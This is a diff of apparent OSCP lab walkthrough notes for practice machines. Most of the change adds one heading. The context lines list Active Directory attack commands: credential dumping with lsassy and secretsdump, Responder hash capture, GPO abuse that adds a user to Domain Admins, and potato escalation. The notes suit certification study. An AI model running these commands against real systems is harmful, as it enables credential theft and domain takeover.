@@ -7,8 +7,10 @@
 2. M2 - `impacket-mssqlclient {{DOMAIN}}/sql_svc:Dolphin1@{{MACHINE_IP}} -windows-auth` 
 3. M2 - Use mssql shell to potato, then download hives, check C:\Windows.old download more hives and spray creds. 
 
-#### OSCP C => ??? 
-1. ??? 
+#### OSCP C => Creds in binaries  
+1. Dealing with Autologon64.exe and admintool.exe was such a pain...  
+2. 
+3. 
 
 #### Secura => Lsassy, MySQL, WriteOwner + GPLink 
 1. On M1 user is admin, run `nxc smb {{TARGET_IP}} -u {{USERNAME}} -p '{{PASSWORD}}' -M lsassy` 
@@ -19,6 +21,7 @@
 6. On M2 `Add-DomainObjectAcl -TargetIdentity "31B2F340-016D-11D2-945F-00C04FB984F9" -PrincipalIdentity charlotte -Rights All -Server {{DC_IP}} -Credential $Cred` 
 7. On kali `python3 pygpoabuse.py -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9" -dc-ip {{DC_IP}} -command "net group \"Domain Admins\" charlotte /add /domain" 'secura.yzx/charlotte:{{PASSWORD}}'` 
 8. On M3 `gpupdate /force` then kali `impacket-secretsdump 'secura.yzx/charlotte:{{PASSWORD}}@{{DC_IP}}'` 
+
 
 ==== 
 
@@ -51,6 +54,7 @@
 #### Vault => Responder on icon.url 
 1. Put icon.url in writable smb, then let responder get hash. 
 2. Either replace utilman with cmd (SeRestorePrivilege) or abuse GenericWrite on Default Domain Policy using `./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"` then `gpupdate /force` 
+
 
 ==== 
 
